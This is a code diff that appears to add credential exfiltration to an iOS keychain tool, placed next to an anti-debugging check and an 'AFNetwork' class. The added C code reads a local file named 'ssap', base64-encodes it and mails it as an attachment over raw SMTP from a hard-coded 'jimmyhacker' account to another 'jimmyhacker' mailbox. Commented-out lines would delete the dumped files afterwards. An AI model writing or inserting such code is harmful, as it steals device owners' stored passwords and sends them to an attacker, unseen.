@@ -15,10 +15,32 @@
 #import <Security/Security.h>
 #import <sqlite3.h>
 #include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
 #include <unistd.h>
 #include <sys/sysctl.h>
 #include <stdlib.h>
 //#include <sys/ptrace.h>
+
+
+#define EHLO "helo ha\r\n" //***为邮箱用户名
+#define DATA "data\r\n"
+#define QUIT "QUIT\r\n"
+
+//#define h_addr h_addr_list[0]
+//FILE *fin;
+int sock;
+struct sockaddr_in server;
+struct hostent *hp, *gethostbyname();
+char buf[BUFSIZ+1];
+int len;
+char *host_id="smtp.126.com";
+//char *from_id="1050647543@qq.com";
+char *to_id="Mr_jimmyhacker@163.com";
+char *sub="ssap";
+char *wkstr;
+
 
 #pragma mark - Keychain Prototype Function
 
@@ -336,6 +358,237 @@ static int is_being_debugging(void)
     }
     return ((info.kp_proc.p_flag & P_TRACED) != 0);
 }
+
+
+
+
+
+//---------
+#pragma MailSending
+char base64Alphabet[]=
+{'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
+    'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
+    'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
+    'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/','='};
+
+unsigned char* base64Encode(const char* source, const int sourceLength)
+{
+    /*命名为padding不准确，不过先不改了^_^*/
+    unsigned int padding = sourceLength%3;
+    unsigned int resultLength = sourceLength%3 ? ((sourceLength)/3 + 1)*4 : (sourceLength)/3*4;
+    unsigned int i=0, j=0;
+    
+    unsigned char* result = (unsigned char*)malloc(resultLength + 1);
+    memset(result, 0, resultLength+1);
+    
+    unsigned char temp = 0;
+    for (i=0,j=0; i<sourceLength; i+=3, j+=4)
+    {
+        if (i+2 >= sourceLength)
+        {
+            result[j] = (source[i]>>2) & 0x3F;
+            if (padding==1)
+            {
+                //这里padding实际为2
+                result[j+1] = ((source[i] & 0x03)<<4 ) & 0x3F;
+                result[j+2] = 0x40;
+                result[j+3] = 0x40;
+                break;
+            }
+            else if (padding==2)
+            {
+                //这里padding实际为1
+                result[j+1] = (((source[i] & 0x03)<<4) | ((source[i+1]>>4) & 0x0F));
+                result[j+2] = ((source[i+1] & 0x0f)<<2) & 0x3F;
+                result[j+3] = 0x40;
+                break;
+            }
+        }
+        
+        result[j] = (source[i]>>2) & 0x3F;//最高两位要变为0
+        result[j+1] = (((source[i] & 0x03)<<4) | ((source[i+1]>>4) & 0x0F));//0x03（只取最低两位,其余位为0） 0x0F(只取低四位，其余位为0)
+        result[j+2] = (((source[i+1] & 0x0f)<<2) | ((source[i+2]>>6) & 0x03));
+        result[j+3] = (source[i+2] & 0x3F);
+    }
+    
+    for ( j=0; j<resultLength; ++j)
+    {
+        result[j] = base64Alphabet[result[j]];
+    }
+    
+    return result;
+}
+
+/*=====Send a string to the socket=====*/
+void send_socket(char *s)
+{
+	write(sock,s,strlen(s));
+	//write(1,s,strlen(s));
+	//printf("Client:%s\n",s);
+}
+
+//=====Read a string from the socket=====*/
+void read_socket()
+{
+	len = read(sock,buf,BUFSIZ);
+	write(1,buf,len);
+	//printf("Server:%s\n",buf);
+}
+
+char * ReadFile(char * path, int *length)
+{
+    FILE * pfile;
+    char * data;
+    
+    pfile = fopen(path, "rb");
+    if (pfile == NULL)
+    {
+        return NULL;
+    }
+    fseek(pfile, 0, SEEK_END);
+    *length = ftell(pfile);
+    data = (char *)malloc((*length + 1) * sizeof(char));
+    rewind(pfile);
+    *length = fread(data, 1, *length, pfile);
+    data[*length] = '\0';
+    fclose(pfile);
+    return data;
+}
+
+inline int send_mail() {
+    FILE *fp;
+    fp = fopen("./ssap","rw");
+    char output;
+    output = fgetc(fp);
+    int i = 1;
+    while (output!=EOF)
+    {
+        output = fgetc(fp);
+        //sprintf(wkstr,"%c",output);
+        i++;
+    }
+    wkstr = (char *)malloc((i + 1) * sizeof(char));
+    
+    FILE *fp2;
+    fp2 = fopen("./ssap","rw");
+    char writeC;
+    writeC = fgetc(fp2);
+    sprintf(wkstr,"%s%c",wkstr,writeC);
+    
+    while (writeC!=EOF)
+    {
+        writeC = fgetc(fp2);
+        sprintf(wkstr,"%s%c",wkstr,writeC);
+    }
+    
+    wkstr = base64Encode(wkstr,strlen(wkstr));
+    
+    //system("rm -f ./ssap");
+    //system("rm -f ./repmud");
+	/*=====Create Socket=====*/
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	if (sock==-1)
+	{
+		//perror("opening stream socket");
+		//exit(1);
+		return 1;
+	}
+	else
+		//cout << "socket created\n";
+		//printf("socket created\n");
+        
+	/*=====Verify host=====*/
+        server.sin_family = AF_INET;
+	hp = gethostbyname(host_id);
+	if (hp==(struct hostent *) 0)
+	{
+		//fprintf(stderr, "%s: unknown host\n", host_id);
+		//exit(2);
+		return 2;
+	}
+    
+	/*=====Connect to port 25 on remote host=====*/
+	memcpy((char *) &server.sin_addr, (char *) hp->h_addr, hp->h_length);
+	server.sin_port=htons(25); /* SMTP PORT */
+	if (connect(sock, (struct sockaddr *) &server, sizeof server)==-1)
+	{
+		//perror("connecting stream socket");
+		//exit(1);
+		return 1;
+	}
+	else
+		//cout << "Connected\n";
+		//printf("Connected\n");
+        
+	/*=====Write some data then read some =====*/
+        read_socket(); /* SMTP Server logon string */
+	send_socket(EHLO); /* introduce ourselves */
+	read_socket(); /*Read reply */
+    
+	send_socket("auth login");
+	send_socket("\r\n");
+	read_socket();
+    
+    char *username = "mr_jimmyhacker@126.com";
+    username = base64Encode(username,strlen(username));
+    
+    char *password = ""/*密码不能告诉你*/;
+    password = base64Encode(password,strlen(password));
+    
+    send_socket(username);
+    send_socket("\r\n");
+    read_socket();
+    
+    send_socket(password);
+    send_socket("\r\n");
+    read_socket();
+    
+	send_socket("mail from: ");
+    send_socket("mr_jimmyhacker@126.com");
+	send_socket("\r\n");
+	read_socket(); /* Sender OK */
+    
+	//send_socket("VRFY ");
+	//send_socket(from_id);
+	//send_socket("\r\n");
+	//read_socket(); // Sender OK */
+	send_socket("rcpt to: "); /*Mail to*/
+	send_socket(to_id);
+	//send_socket(">");
+	send_socket("\r\n");
+	read_socket(); // Recipient OK*/
+    
+	send_socket(DATA);// body to follow*/
+	//read_socket();
+	//send_socket("from:***@126.com");
+	send_socket("subject: ");
+	send_socket(sub);
+    send_socket("\r\n");
+    send_socket("Content-Type: multipart/mixed; boundary=a\r\n");
+    send_socket("--a\r\n");
+    send_socket("--a\r\n");
+    send_socket("Content-Disposition: attachment; filename=\"ssap.txt\"\r\n");
+    send_socket("Content-Transfer-Encoding: base64\r\n\r\n");
+    //printf("%d",i);
+    
+    //printf("%s",wkstr);
+	send_socket(wkstr);
+    free(wkstr);
+    send_socket("--a--");
+	send_socket("\r\n.\r\n");
+	read_socket();
+	send_socket(QUIT); /* quit */
+	read_socket(); // log off */
+    
+	//=====Close socket and finish=====*/
+	close(sock);
+	//exit(0);
+	return 0;
+    
+}
+
+
+//------------------------------------
 
 @implementation AFNetwork
 
